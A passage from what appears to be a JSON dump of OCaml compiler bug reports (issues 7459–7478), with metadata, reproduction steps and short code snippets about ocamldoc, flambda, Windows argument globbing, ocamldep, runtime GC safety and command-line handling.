look!\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7478\n**Reporter:** @dbuenzli\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-08-09T09:44:37Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** ocamldoc\n**Tags:** github\n**Monitored by:** @gasche @dbuenzli\n\n## Bug description\n\nI suspect this is not a doc attachement issue (at least the dupe doesn't happen with odoc on 4.03).  With ocamldoc 4.0{4,3}.0, \"Hey ho\" shows up twice in the generated doc. Note that if you remove the 'open String' this doesn't happen.\n\n## Steps to reproduce\n\n> cat bla.mli \r\n\r\nopen String\r\n\r\n(** Hey ho *)\r\n\r\n> ocamldoc -html bla.mli\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7477\n**Reporter:** @Chris00\n**Assigned to:** @yallop\n**Status:** closed (set by @yallop on 2017-02-09T11:07:15Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Platform:** x86_64\n**OS:** GNU/Linux\n**OS Version:** Debian testing\n**Category:** ~DO NOT USE (was: OCaml general)\n**Duplicate of:** #6271\n**Monitored by:** @gasche @Chris00\n\n## Bug description\n\nGiven that\r\n\r\nclass foo =\r\n  let z = 1 in\r\n  object\r\n    method x = 1\r\n  end\r\n\r\nworks, it would be natural to also be able to write\r\n\r\nclass foo =\r\n  let module Z = ... in\r\n  object\r\n    method x = 1\r\n  end\r\n\r\nclass foo =\r\n  let exception X in\r\n  object\r\n    method x = 1\r\n  end\r\n\r\nand\r\n\r\nclass foo =\r\n  let open Z in\r\n  object\r\n    method x = 1\r\n  end\n"},{"labels":["bug"],"text":"**Original bug ID:** 7476\n**Reporter:** @dbuenzli\n**Assigned to:** @dra27\n**Status:** closed (set by @dra27 on 2017-02-08T16:44:42Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIn contrast to what the documentation says it seems the binary specified via `-cc` is only invoked for linking but not for compiling. Same holds for the options passed via `-ccopt`.\n\n## Steps to reproduce\n\ncd /tmp\r\necho 'let () = print_endline \"bla\"' > test.ml\r\nocamlopt -verbose -cc echo test.ml\r\n+ clang -arch x86_64 -c -o 'test.o' '/var/folders/g4/nl6g_ytj63bbn9d45_jhggxc0000gn/T/camlasm884347.s'\r\n+ clang -arch x86_64 -c -o '/var/folders/g4/nl6g_ytj63bbn9d45_jhggxc0000gn/T/camlstartupb51826.o' '/var/folders/g4/nl6g_ytj63bbn9d45_jhggxc0000gn/T/camlstartup75575a.s'\r\n+ echo -o 'a.out'   '-L/Users/dbuenzli/.opam/4.04.0/lib/ocaml'  '/var/folders/g4/nl6g_ytj63bbn9d45_jhggxc0000gn/T/camlstartupb51826.o' '/Users/dbuenzli/.opam/4.04.0/lib/ocaml/std_exit.o' 'test.o' '/Users/dbuenzli/.opam/4.04.0/lib/ocaml/stdlib.a' '/Users/dbuenzli/.opam/4.04.0/lib/ocaml/libasmrun.a' \r\n-o a.out -L/Users/dbuenzli/.opam/4.04.0/lib/ocaml /var/folders/g4/nl6g_ytj63bbn9d45_jhggxc0000gn/T/camlstartupb51826.o /Users/dbuenzli/.opam/4.04.0/lib/ocaml/std_exit.o test.o /Users/dbuenzli/.opam/4.04.0/lib/ocaml/stdlib.a /Users/dbuenzli/.opam/4.04.0/lib/ocaml/libasmrun.a\n"},{"labels":[null,"bug",null,null],"text":"**Original bug ID:** 7474\n**Reporter:** gerd\n**Assigned to:** @mshinwell\n**Status:** resolved (set by @xavierleroy on 2017-02-16T10:07:00Z)\n**Resolution:** fixed\n**Priority:** high\n**Severity:** crash\n**Version:** 4.04.0\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** back end (clambda to assembly)\n**Duplicate of:** #7426\n\n## Bug description\n\nCurrently, ocamlnet cannot be built with 4.04+flambda:\r\n\r\nocamlfind ocamlopt -g  -safe-string -I ../../src/equeue -I ../../src/netsys -I ../../src/netstring -I ../../src/netgssapi -package \"bytes unix\" -pp \"../../tools/cppo-0.9.4/cppo -include ../../config.cppo -D HAVE_BYTES \" -w -25 -c  rpc_transport.ml\r\n>> Fatal error: Assignment of a float to a specialised non-float array: (array.unsafe_set[addr]<>\r\n                                                          self/5708\r\n                                                          timeout/5703\r\n                                                          Parraysetu_arg/5735)\n\n## Steps to reproduce\n\nopam install ocamlnet\n\n## Additional information\n\nApparently, this has to do with the mutable field \"timeout\" in Rpc_transport.internal_rpc_multiplex_controller, which is a float. The build continues when I change the type of the field into something that is not directly a float (e.g. into a float ref). (However, the build fails then with the same error in a different file - could it be that flambda was never really tested with objects?)\r\n\r\nThe code looks like:\r\n\r\nlet internal_rpc_multiplex_controller\r\n        ?(dbg_name = ref \"\")\r\n        ?(close_inactive_descr=false)\r\n        ?(preclose=fun() -> ())\r\n        rd_pipe wr_pipe esys\r\n      : rpc_multiplex_controller =\r\n  let sockaddr = `Implied in\r\nobject(self)\r\n  val mutable alive = true\r\n  val mutable rd_engine = None\r\n  val mutable rd_eof = false\r\n\r\n  val mutable wr_engine = None\r\n\r\n  val mutable timeout = (-1.0)              (* THIS FIELD CAUSES THE ERROR *)\r\n  val mutable tmo_notify = (fun () -> ())\r\n\r\n  ...\r\nend\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7473\n**Reporter:** @protz\n**Status:** resolved (set by @xavierleroy on 2017-02-06T18:58:31Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.04.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** platform support (windows, cross-compilation, etc)\n\n## Bug description\n\nConsider this:\r\n\r\n<pre>\r\nD:\\cygwin\\home\\protz\\Code\\hacl-star\\code\\curve25519>.\\camlprog.exe Hacl.Spec.*\r\n.\\camlprog.exe\r\nHacl.Spec.*Hacl.Spec.Bignum.Crecip.fst\r\nHacl.Spec.*Hacl.Spec.Bignum.Crecip.fst.hints\r\nHacl.Spec.*Hacl.Spec.Bignum.Fmul.Lemmas.fst\r\nHacl.Spec.*Hacl.Spec.Bignum.Fsquare.fst\r\nHacl.Spec.*Hacl.Spec.Bignum.Fsquare.fst.hints\r\nHacl.Spec.*Hacl.Spec.Bignum.Modulo.fst\r\nHacl.Spec.*Hacl.Spec.Bignum.Modulo.fst.hints\r\nHacl.Spec.*Hacl.Spec.EC.AddAndDouble.fst\r\nHacl.Spec.*Hacl.Spec.EC.AddAndDouble.fst.hints\r\nHacl.Spec.*Hacl.Spec.EC.AddAndDouble2.fst\r\nHacl.Spec.*Hacl.Spec.EC.AddAndDouble2.fst.hints\r\nHacl.Spec.*Hacl.Spec.EC.Format.fst\r\nHacl.Spec.*Hacl.Spec.EC.Format.fst.hints\r\nHacl.Spec.*Hacl.Spec.EC.fst\r\nHacl.Spec.*Hacl.Spec.EC.Ladder.fst\r\nHacl.Spec.*Hacl.Spec.EC.Ladder.fst.hints\r\nHacl.Spec.*Hacl.Spec.EC.Point.fst\r\nHacl.Spec.*Hacl.Spec.EC.Point.fst.hints\r\n\r\nD:\\cygwin\\home\\protz\\Code\\hacl-star\\code\\curve25519>type test.ml\r\nlet _ = Array.iter print_endline Sys.argv\r\n</pre>\r\n\r\nThis is the native windows toolchain, compiled with x86_64-w64-mingw32.\r\n\r\nThis is the contents of the directory:\r\n<pre>\r\nD:\\cygwin\\home\\protz\\Code\\hacl-star\\code\\curve25519>dir\r\n Volume in drive D is DATADRIVE1\r\n Volume Serial Number is BA7C-B54F\r\n\r\n Directory of D:\\cygwin\\home\\protz\\Code\\hacl-star\\code\\curve25519\r\n\r\n01/31/2017  09:24 AM    <DIR>          .\r\n01/31/2017  09:24 AM    <DIR>          ..\r\n01/31/2017  09:24 AM             6,697 .vimsession\r\n01/31/2017  09:24 AM           142,833 a.exe\r\n01/31/2017  09:16 AM           634,551 camlprog.exe\r\n01/31/2017  08:35 AM               581 Curve25519.fst\r\n01/31/2017  08:54 AM                26 FStar.c\r\n01/31/2017  08:54 AM             1,057 FStar.h\r\n01/30/2017  03:25 PM               431 Hacl.Bignum.Constants.fst\r\n01/30/2017  03:25 PM               755 Hacl.Bignum.Constants.fst.hints\r\n01/30/2017  03:25 PM            12,781 Hacl.Bignum.Crecip.fst\r\n01/30/2017  03:25 PM            72,855 Hacl.Bignum.Crecip.fst.hints\r\n01/30/2017  03:25 PM             5,860 Hacl.Bignum.Fsquare.fst\r\n01/30/2017  03:25 PM            25,175 Hacl.Bignum.Fsquare.fst.hints\r\n01/30/2017  03:25 PM             3,850 Hacl.Bignum.Modulo.fst\r\n01/30/2017  03:25 PM            29,194 Hacl.Bignum.Modulo.fst.hints\r\n01/30/2017  03:25 PM            10,024 Hacl.Bignum.Parameters.fst\r\n01/30/2017  03:25 PM            61,043 Hacl.Bignum.Parameters.fst.hints\r\n01/30/2017  04:03 PM            28,499 Hacl.EC.AddAndDouble.fst\r\n01/30/2017  03:25 PM            38,849 Hacl.EC.AddAndDouble.fst.hints\r\n01/30/2017  03:47 PM             9,843 Hacl.EC.Format.fst\r\n01/30/2017  03:25 PM            57,407 Hacl.EC.Format.fst.hints\r\n01/31/2017  08:37 AM             3,378 Hacl.EC.fst\r\n01/30/2017  03:25 PM            19,832 Hacl.EC.fst.hints\r\n01/30/2017  03:47 PM             1,139 Hacl.EC.Ladder.BigLoop.fst\r\n01/30/2017  03:25 PM             6,384 Hacl.EC.Ladder.BigLoop.fst.hints\r\n01/30/2017  03:47 PM             5,071 Hacl.EC.Ladder.fst\r\n01/30/2017  03:25 PM            35,464 Hacl.EC.Ladder.fst.hints\r\n01/30/2017  03:25 PM             6,820 Hacl.EC.Ladder.SmallLoop.fst\r\n01/30/2017  03:25 PM            24,478 Hacl.EC.Ladder.SmallLoop.fst.hints\r\n01/30/2017  03:25 PM             6,970 Hacl.EC.Point.fst\r\n01/30/2017  03:25 PM            37,136 Hacl.EC.Point.fst.hints\r\n01/30/2017  03:25 PM             2,482 Hacl.Spec.Bignum.Crecip.fst\r\n01/30/2017  03:25 PM            12,340 Hacl.Spec.Bignum.Crecip.fst.hints\r\n01/30/2017  03:25 PM               787 Hacl.Spec.Bignum.Fmul.Lemmas.fst\r\n01/30/2017  03:25 PM            39,477 Hacl.Spec.Bignum.Fsquare.fst\r\n01/30/2017  03:25 PM           127,079 Hacl.Spec.Bignum.Fsquare.fst.hints\r\n01/30/2017  03:25 PM            11,630 Hacl.Spec.Bignum.Modulo.fst\r\n01/30/2017  03:25 PM            78,665 Hacl.Spec.Bignum.Modulo.fst.hints\r\n01/30/2017  03:25 PM            43,828 Hacl.Spec.EC.AddAndDouble.fst\r\n01/30/2017  03:25 PM           231,152 Hacl.Spec.EC.AddAndDouble.fst.hints\r\n01/30/2017  03:25 PM             5,088 Hacl.Spec.EC.AddAndDouble2.fst\r\n01/30/2017  03:25 PM            13,539 Hacl.Spec.EC.AddAndDouble2.fst.hints\r\n01/30/2017  03:47 PM             7,025 Hacl.Spec.EC.Format.fst\r\n01/30/2017  03:25 PM            31,046 Hacl.Spec.EC.Format.fst.hints\r\n01/30/2017  03:25 PM               578 Hacl.Spec.EC.fst\r\n01/30/2017  03:47 PM             3,668 Hacl.Spec.EC.Ladder.fst\r\n01/30/2017  03:25 PM             7,644 Hacl.Spec.EC.Ladder.fst.hints\r\n01/30/2017  03:25 PM             2,841 Hacl.Spec.EC.Point.fst\r\n01/30/2017  03:25 PM            16,367 Hacl.Spec.EC.Point.fst.hints\r\n01/30/2017  03:47 PM             2,384 Hacl.Test.X25519.fst\r\n01/31/2017  08:54 AM             1,056 Hacl_Bignum.c\r\n01/31/2017  08:54 AM             1,698 Hacl_Bignum.h\r\n01/31/2017  08:54 AM               314 Hacl_Bignum_Constants.c\r\n01/31/2017  08:54 AM               651 Hacl_Bignum_Constants.h\r\n01/31/2017  08:54 AM             2,477 Hacl_Bignum_Crecip.c\r\n01/31/2017  08:54 AM             1,273 Hacl_Bignum_Crecip.h\r\n01/31/2017  08:54 AM               363 Hacl_Bignum_Fdifference.c\r\n01/31/2017  08:54 AM             1,337 Hacl_Bignum_Fdifference.h\r\n01/31/2017  08:54 AM             1,782 Hacl_Bignum_Fmul.c\r\n01/31/2017  08:54 AM             1,594 Hacl_Bignum_Fmul.h\r\n01/31/2017  08:54 AM             2,682 Hacl_Bignum_Fproduct.c\r\n01/31/2017  08:54 AM             1,691 Hacl_Bignum_Fproduct.h\r\n01/31/2017  08:54 AM               540 Hacl_Bignum_Fscalar.c\r\n01/31/2017  08:54 AM             1,471 Hacl_Bignum_Fscalar.h\r\n01/31/2017  08:54 AM             3,111 Hacl_Bignum_Fsquare.c\r\n01/31/2017  08:54 AM             1,357 Hacl_Bignum_Fsquare.h\r\n01/31/2017  08:54 AM               328 Hacl_Bignum_Fsum.c\r\n01/31/2017  08:54 AM             1,112 Hacl_Bignum_Fsum.h\r\n01/31/2017  08:54 AM             2,700 Hacl_Bignum_Limb.c\r\n01/31/2017  08:54 AM             2,350 Hacl_Bignum_Limb.h\r\n01/31/2017  08:54 AM             1,811 Hacl_Bignum_Modulo.c\r\n01/31/2017  08:54 AM             1,480 Hacl_Bignum_Modulo.h\r\n01/31/2017  08:54 AM             5,626 Hacl_Bignum_Parameters.c\r\n01/31/2017  08:54 AM             4,634 Hacl_Bignum_Parameters.h\r\n01/31/2017  08:54 AM             3,554 Hacl_Bignum_Wide.c\r\n01/31/2017  08:54 AM             2,686 Hacl_Bignum_Wide.h\r\n01/31/2017  08:54 AM             2,251 Hacl_Cast.c\r\n01/31/2017  08:54 AM             1,602 Hacl_Cast.h\r\n01/31/2017  08:54 AM             1,307 Hacl_EC.c\r\n01/31/2017  08:54 AM             1,607 Hacl_EC.h\r\n01/31/2017  08:54 AM             3,232 Hacl_EC_AddAndDouble.c\r\n01/31/2017  08:54 AM             1,530 Hacl_EC_AddAndDouble.h\r\n01/31/2017  08:54 AM             5,020 Hacl_EC_Format.c\r\n01/31/2017  08:54 AM             1,545 Hacl_EC_Format.h\r\n01/31/2017  08:54 AM               879 Hacl_EC_Ladder.c\r\n01/31/2017  08:54 AM             1,983 Hacl_EC_Ladder.h\r\n01/31/2017  08:54 AM               518 Hacl_EC_Ladder_BigLoop.c\r\n01/31/2017  08:54 AM             1,651 Hacl_EC_Ladder_BigLoop.h\r\n01/31/2017  08:54 AM             2,043 Hacl_EC_Ladder_SmallLoop.c\r\n01/31/2017  08:54 AM             1,675 Hacl_EC_Ladder_SmallLoop.h\r\n01/31/2017  08:54 AM             1,505 Hacl_EC_Point.c\r\n01/31/2017  08:54 AM             1,728 Hacl_EC_Point.h\r\n01/31/2017  08:54 AM               568 Hacl_Spec_Bignum.c\r\n01/31/2017  08:54 AM               990 Hacl_Spec_Bignum.h\r\n01/31/2017  08:54 AM             1,950 Hacl_Spec_Bignum_Bigint.c\r\n01/31/2017  08:54 AM             1,800 Hacl_Spec_Bignum_Bigint.h\r\n01/31/2017  08:54 AM             1,178 Hacl_Spec_Bignum_Crecip.c\r\n01/31/2017  08:54 AM             1,511 Hacl_Spec_Bignum_Crecip.h\r\n01/31/2017  08:54 AM               420 Hacl_Spec_Bignum_Fdifference.c\r\n01/31/2017  08:54 AM               962 Hacl_Spec_Bignum_Fdifference.h\r\n01/31/2017  08:54 AM             1,927 Hacl_Spec_Bignum_Field.c\r\n01/31/2017  08:54 AM             2,058 Hacl_Spec_Bignum_Field.h\r\n01/31/2017  08:54 AM             2,064 Hacl_Spec_Bignum_Fmul.c\r\n01/31/2017  08:54 AM             2,147 Hacl_Spec_Bignum_Fmul.h\r\n01/31/2017  08:54 AM             3,022 Hacl_Spec_Bignum_Fproduct.c\r\n01/31/2017  08:54 AM             2,630 Hacl_Spec_Bignum_Fproduct.h\r\n01/31/2017  08:54 AM               680 Hacl_Spec_Bignum_Fscalar.c\r\n01/31/2017  08:54 AM             1,085 Hacl_Spec_Bignum_Fscalar.h\r\n01/31/2017  08:54 AM             7,572 Hacl_Spec_Bignum_Fsquare.c\r\n01/31/2017  08:54 AM             6,507 Hacl_Spec_Bignum_Fsquare.h\r\n01/31/2017  08:54 AM               371 Hacl_Spec_Bignum_Fsum.c\r\n01/31/2017  08:54 AM               949 Hacl_Spec_Bignum_Fsum.h\r\n01/31/2017  08:54 AM             1,503 Hacl_Spec_Bignum_Modulo.c\r\n01/31/2017  08:54 AM             1,480 Hacl_Spec_Bignum_Modulo.h\r\n01/31/2017  08:54 AM             5,081 Hacl_Spec_EC_AddAndDouble.c\r\n01/31/2017  08:54 AM             4,828 Hacl_Spec_EC_AddAndDouble.h\r\n01/31/2017  08:54 AM             2,546 Hacl_Spec_EC_AddAndDouble2.c\r\n01/31/2017  08:54 AM             2,543 Hacl_Spec_EC_AddAndDouble2.h\r\n01/31/2017  08:54 AM             1,836 Hacl_Spec_EC_Format.c\r\n01/31/2017  08:54 AM             1,899 Hacl_Spec_EC_Format.h\r\n01/31/2017  08:54 AM             5,947 Hacl_Spec_EC_Ladder.c\r\n01/31/2017  08:54 AM             2,741 Hacl_Spec_EC_Ladder.h\r\n01/31/2017  08:54 AM             3,283 Hacl_Spec_EC_Point.c\r\n01/31/2017  08:54 AM             2,593 Hacl_Spec_EC_Point.h\r\n01/31/2017  08:54 AM             4,045 Hacl_Test_X25519.c\r\n01/31/2017  08:54 AM             1,592 Hacl_Test_X25519.h\r\n01/31/2017  08:54 AM             3,437 Hacl_UInt128.c\r\n01/31/2017  08:54 AM             2,433 Hacl_UInt128.h\r\n01/31/2017  08:54 AM             2,545 Hacl_UInt32.c\r\n01/31/2017  08:54 AM             2,106 Hacl_UInt32.h\r\n01/31/2017  08:54 AM             2,545 Hacl_UInt64.c\r\n01/31/2017  08:54 AM             1,992 Hacl_UInt64.h\r\n01/31/2017  08:54 AM             2,429 Hacl_UInt8.c\r\n01/31/2017  08:54 AM             1,965 Hacl_UInt8.h\r\n01/31/2017  09:15 AM             2,623 Makefile\r\n01/31/2017  08:54 AM                26 Prims.c\r\n01/31/2017  08:54 AM               126 Prims.h\r\n01/31/2017  09:24 AM               119 test.c\r\n01/31/2017  09:16 AM               234 test.cmi\r\n01/31/2017  09:16 AM               287 test.cmx\r\n01/31/2017  09:16 AM                42 test.ml\r\n01/31/2017  09:16 AM             1,112 test.o\r\n01/31/2017  08:55 AM    <DIR>          x25519-c\r\n01/31/2017  08:55 AM           654,423 x25519.exe\r\n             142 File(s)      2,767,109 bytes\r\n               3 Dir(s)  899,522,285,568 bytes free\r\n</pre>\r\n\r\nNote that I'm running this within a Windows shell to rule out Cygwin behavior.\r\n\r\nNote also:\r\n\r\n<pre>\r\nD:\\cygwin\\home\\protz\\Code\\hacl-star\\code\\curve25519>type test.c\r\n#include <stdio.h>\r\n\r\nint main(int argc, char *argv[]) {\r\n  for (int i = 0; i < argc; ++i)\r\n    printf(\"%s\\n\", argv[i]);\r\n}\r\n\r\nD:\\cygwin\\home\\protz\\Code\\hacl-star\\code\\curve25519>.\\a.exe Hacl.Spec.*\r\n.\\a.exe\r\nHacl.Spec.*\r\n</pre>\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7471\n**Reporter:** antron\n**Status:** closed (set by @mshinwell on 2017-03-10T08:25:48Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Category:** typing\n**Duplicate of:** #7451\n\n## Bug description\n\nSee code below.\n\n## Steps to reproduce\n\nrepro.ml:\r\n\r\n\r\ntype t = Wrap of unit\r\n  [@@ocaml.unboxed]\r\n\r\nlet () =\r\n  let wrapped = () in\r\n  let wrapper = Wrap wrapped in\r\n\r\n  assert (Obj.repr wrapped == Obj.repr wrapper);\r\n\r\n  let Wrap () = wrapper in\r\n\r\n  match wrapper with\r\n  | Wrap () -> ()\r\n\r\n\r\nCompiling this with\r\n\r\n  ocamlfind opt -w +A -linkpkg repro.ml\r\n\r\nresults in the output:\r\n\r\nFile \"repro.ml\", line 10, characters 6-13:\r\nWarning 4: this pattern-matching is fragile.\r\nIt will remain exhaustive when constructors are added to type t.\r\nFile \"repro.ml\", line 12, characters 2-38:\r\nWarning 4: this pattern-matching is fragile.\r\nIt will remain exhaustive when constructors are added to type t.\r\n\r\nIf the [@@unboxed] attribute is removed from type t, no warnings are emitted. I expected no warnings with and without the attribute.\n"},{"labels":[null,"bug",null,null],"text":"**Original bug ID:** 7470\n**Reporter:** @Octachron\n**Assigned to:** @Octachron\n**Status:** assigned (set by @xavierleroy on 2017-02-19T16:55:35Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** minor\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Related to:** #8427 #4081 #4618 #5624 #5870\n\n## Bug description\n\nOcamldep is overly optimistic when opening or including unknown modules, which can lead to missed dependencies.\r\n\r\nConsider this set of three files\r\n\r\n(* a.ml *)\r\nmodule M = struct module N = struct end end\r\nopen B\r\nopen M\r\n;; N.x\r\n\r\n(* b.ml *)\r\nmodule M = struct end\r\n\r\n(* n.ml *)\r\nlet x = 1\r\n\r\nRunning `ocamldep -modules a.ml` yields:\r\n\r\na.ml : B\r\n\r\nwhereas the correct dependencies would be\r\n\r\na.ml : B N\r\n\r\nThe dependency over the module N is missed, because ocamldep infers (erroneously) that the module M opened by \"open M\" is A.M whereas the module truly opened is B.M.\r\n\r\n(I am not sure if this problem ever happens in real situation, but I thought it ought to be at least referenced.)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7469\n**Reporter:** @dra27\n**Assigned to:** @dra27\n**Status:** assigned (set by @dra27 on 2017-01-27T17:48:39Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Target version:** later\n**Category:** runtime system and C interface\n\n## Bug description\n\nThe clock function in the Microsoft CRT returns wall clock and not CPU time.\n\n## Steps to reproduce\n\nSee https://msdn.microsoft.com/en-us/library/4e2ess30.aspx\n\n## Additional information\n\nGetProcessTimes should give a value closer to getrusage(RUSAGE_SELF, ...)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7468\n**Reporter:** @oandrieu\n**Assigned to:** @xavierleroy\n**Status:** resolved (set by @xavierleroy on 2017-02-16T19:01:55Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** runtime system and C interface\n\n## Bug description\n\nThe helper function caml_alloc_sprintf works by calling vsnprintf, then caml_alloc_string, then it may call vsnprintf again if the result does not fit in the 64 bytes static buffer.\r\n\r\nThis means that it's unsafe to use an OCaml string via String_val as the format string or as an argument since the caml_alloc_string call may trigger a GC and move the string around and leave caml_alloc_sprintf with a stale pointer.\r\n\r\nIn floats.c, caml_format_float calls caml_alloc_sprintf in such a way:\r\n    res = caml_alloc_sprintf(String_val(fmt), d);\r\nand in CamlInternalFormat, format_float is called with a constructed OCaml string which may be moved or reclaimed by the GC.\n\n## Additional information\n\nI can provide a patch if you agree on the analysis.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7466\n**Reporter:** @oandrieu\n**Assigned to:** @diml\n**Status:** resolved (set by @diml on 2017-02-01T12:22:29Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Fixed in version:** 4.04.1+dev\n**Category:** ~DO NOT USE (was: OCaml general)\n**Tags:** junior_job\n\n## Bug description\n\nI encountered a couple of AST fragments that are mis-printed by Pprintast:\r\n- Pexp_setfield\r\n- prefix operator applications\n\n## Steps to reproduce\n\nadd at the end of testsuite/tests/parsetree/source.ml :\r\n\r\nlet f x =\r\n  x.contents <- (print_string \"coucou\" ; x.contents)\r\n\r\nlet ( ~$ ) x = Some x\r\nlet g x =\r\n  ~$ (x.contents)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7463\n**Reporter:** jilljenn\n**Status:** resolved (set by @xavierleroy on 2017-01-28T17:43:36Z)\n**Resolution:** won't fix\n**Priority:** normal\n**Severity:** minor\n**Platform:** Mac\n**OS:** OS X El Capitan\n**OS Version:** 10.11.6\n**Version:** 4.04.0\n**Category:** standard library\n\n## Bug description\n\nWhenever I do \"ocaml graphics.cma\", then:\r\n\r\n# open Graphics;;\r\n# open_graph \"\";;\r\n# sound 440 1000;;\r\n\r\nI only hear the system beep, instead of the requested frequency (440 Hz).\r\n\r\nIt was quite cumbersome to get the Graphics library working (because of XQuartz replacing X11). I followed these instructions:\r\nhttp://www.cis.upenn.edu/~cis120/current/ocaml_setup.shtml\r\n\r\nApparently I got the same problem 9 years ago, under Caml Light:\r\nhttp://caml.inria.fr/pub/ml-archives/caml-list/2008/01/ec702a21efe0060d15766bacce6c073b.fr.html\n\n## Steps to reproduce\n\nType \"ocaml graphics.cma\" in a console, then:\r\n\r\n# open Graphics;;\r\n# open_graph \"\";;\r\n# sound 440 1000;;\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7462\n**Reporter:** @oandrieu\n**Assigned to:** @dra27\n**Status:** resolved (set by @alainfrisch on 2017-01-24T10:59:40Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** documentation\n\n## Bug description\n\nThe README.win32 file mentions that Â« Cygwin-generated .exe files refer to a DLL that is distributed under the GPL. Thus, these .exe files can only be distributed under a license that is compatible with the GPL. Â»\r\n\r\nMind that the Cygwin licence has changed since version 2.5.2 and the cygwin DLL is now licensed under the LGPLv3, with a static linking exception: https://cygwin.com/licensing.html .\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7461\n**Reporter:** @mmottl\n**Assigned to:** @dra27\n**Status:** closed (set by @dra27 on 2017-01-15T14:54:23Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Category:** runtime system and C interface\n**Monitored by:** @mmottl\n\n## Bug description\n\nC-compilers may warn about unused functions due to the declaration of \"static\" functions in the header file \"alloc.h\".  E.g.:\r\n\r\n----------\r\nIn file included from src/utils_c.c:28:\r\n/Users/mmottl/.opam/4.04.0/lib/ocaml/caml/alloc.h:59:21: warning: unused function 'caml_alloc_unboxed' [-Wunused-function]\r\nstatic inline value caml_alloc_unboxed (value arg) { return arg; }\r\n                    ^\r\n/Users/mmottl/.opam/4.04.0/lib/ocaml/caml/alloc.h:60:21: warning: unused function 'caml_alloc_boxed' [-Wunused-function]\r\nstatic inline value caml_alloc_boxed (value arg) {\r\n                    ^\r\n/Users/mmottl/.opam/4.04.0/lib/ocaml/caml/alloc.h:65:21: warning: unused function 'caml_field_unboxed' [-Wunused-function]\r\nstatic inline value caml_field_unboxed (value arg) { return arg; }\r\n                    ^\r\n/Users/mmottl/.opam/4.04.0/lib/ocaml/caml/alloc.h:66:21: warning: unused function 'caml_field_boxed' [-Wunused-function]\r\nstatic inline value caml_field_boxed (value arg) { return Field (arg, 0); }\r\n----------\r\n\r\nIt is generally inadvisable to declare functions as static in header files.  A good explanation of the problem can be found in this answer to a Stackoverflow question:\r\n\r\n  http://stackoverflow.com/a/2846143/2065753\r\n\r\nI assume the intention was to support inlining of these functions for efficiency reasons.  Maybe LTO (Link Time Optimization), which is supported by GCC, is a cleaner solution.  See e.g.: http://stackoverflow.com/a/5988418/2065753\r\n\r\nIf you decide to keep these functions static in the header file, you may want to add \"__attribute__((unused))\" to suppress warnings in user code.\n"},{"labels":["bug"],"text":"**Original bug ID:** 7460\n**Reporter:** @stedolan\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-01-14T21:51:21Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Fixed in version:** 4.04.1+dev\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @gasche\n\n## Bug description\n\nIn both 4.03.0 and 4.04.0, ocamlc responds to unknown options with a usage message:\r\n\r\n    $ ocamlc -wibble\r\n    ocamlc: unknown option '-wibble'.\r\n    Usage: ocamlc <options> <files>\r\n    Options are:\r\n    <option list cut>\r\n\r\n4.03.0 responds similarly to an unknown file extension:\r\n\r\n    $ ocamlc wibble.asdf\r\n    ocamlc: don't know what to do with wibble.asdf.\r\n    Usage: ocamlc <options> <files>\r\n    Options are:\r\n    <option list cut>\r\n\r\nBut 4.04.0 and trunk respond badly:\r\n\r\n    $ ocamlc wibble.asdf\r\n    Fatal error: exception Arg.Bad(\"don't know what to do with wibble.asdf\")\r\n\r\nocamlopt has the same issue.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7459\n**Reporter:** @kayceesrk\n**Status:** resolved (set by @xavierleroy on 2017-02-19T16:51:51Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**OS:** Ubuntu\n**OS Version:** 16.04\n**Version:** 4.04.0\n**Target version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** otherlibs\n**Monitored by:** @yallop\n\n## Bug description\n\nThe systhreads scheduler is initialized (by caml_thread_initialize) when linking against the threads library and the OCaml code refers to the thread module. The initialization ensures that acquiring the runtime acquires the runtime master lock. If the OCaml code does not refer to the Thread module, the initialization code is never run, and the master lock is not initialize.\r\n\r\nA possible fix is to expose `caml_thread_initialize` and require any multi-threaded C program calling into OCaml 